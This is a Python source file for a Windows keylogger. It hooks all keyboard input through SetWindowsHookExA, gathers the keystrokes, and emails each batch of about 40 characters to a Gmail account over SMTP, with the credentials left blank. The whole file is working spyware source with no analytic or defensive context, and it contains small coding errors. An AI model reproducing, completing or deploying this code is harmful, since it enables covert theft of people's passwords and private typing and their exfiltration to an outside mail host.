import sys
from ctypes import *
from ctypes.wintypes import MSG
from ctypes.wintypes import DWORD
import smtplib

user32 = windll.user32
kernel32 = windll.kernel32

WH_KEYBOARD_LL = 13
WM_KEYDOWN = 0x0100
CTRL_CODE = 162
log = ''


def send_Email(msg):

    gmail_user = ''  
    gmail_password = ''

    sent_from = gmail_user  
    to = ['', '']  
    subject = 'Rofl'  
    body = msg

    email_text = """\  
    From: %s  
    To: %s  
    Subject: %s

    %s
    """ % (sent_from, ", ".join(to), subject, body)

    try:  
        server = smtplib.SMTP_SSL('smtp.gmail.com', 465)
        server.ehlo()
        server.login(gmail_user, gmail_password)
        server.sendmail(sent_from, to, email_text)
        server.close()
        print('Email sent!')
    except smtplib.SMTPException:  
        server = smtplib.SMTP_SSL('smtp.gmail.com', 587)
        server.ehlo()
        server.login(gmail_user, gmail_password)
        server.sendmail(sent_from, to, email_text)
        server.close()
        print('Email sent!')
    except:
        pass



class KeyLogger:

    def __init__(self):
        self.lUser32 = user32
        self.hooked = None

    def installHookProc(self, pointer):
        while self.hooked == None:
            try:
                self.hooked = self.lUser32.SetWindowsHookExA(
                    WH_KEYBOARD_LL,
                    pointer,
                    kernel32.GetModuleHandleW(None),
                    0)
            except OSError:
                pass
        if not self.hooked:
            return False
        return True

    def uninstallHookProc(self):
        if self.hooked is None:
            return
        self.lUser32.UnhookWindowsHookEx(self.hooked)
        self.hooked = None


def getFPTR(fn):
    CMPFUNC = CFUNCTYPE(c_int, c_int, c_int, POINTER(c_void_p))
    return CMPFUNC(fn)

def hookProc(nCode, wParam, lParam):
    if wParam is not WM_KEYDOWN:
        return user32.CallNextHookEx(KeyLogger.hooked, nCode, wParam, lParam)
    global log
    hookedKey = hookedKey = chr(lParam[0])
    log = log + hookedKey
    if lParam[0] == 60129542152:
        log = log[:-1]
    print(log)
    if len(log) > 40:
        send_Email(log)
        log = ''
        KeyLogger.uninstallHookProc()
        pointer = getFPTR(hookProc)
        if KeyLogger.installHookProc(pointer):
            print("Hook Reinstalled")
        startKeyLog()
    return user32.CallNextHookEx(KeyLogger.hooked, nCode, wParam, lParam)

def startKeyLog():
    msg = MSG()
    user32.GetMessageA(byref(msg), 0, 0, 0)

KeyLogger = KeyLogger()
pointer = getFPTR(hookProc)
if KeyLogger.installHookProc(pointer):
    print("Hook installed")

startKeyLog()
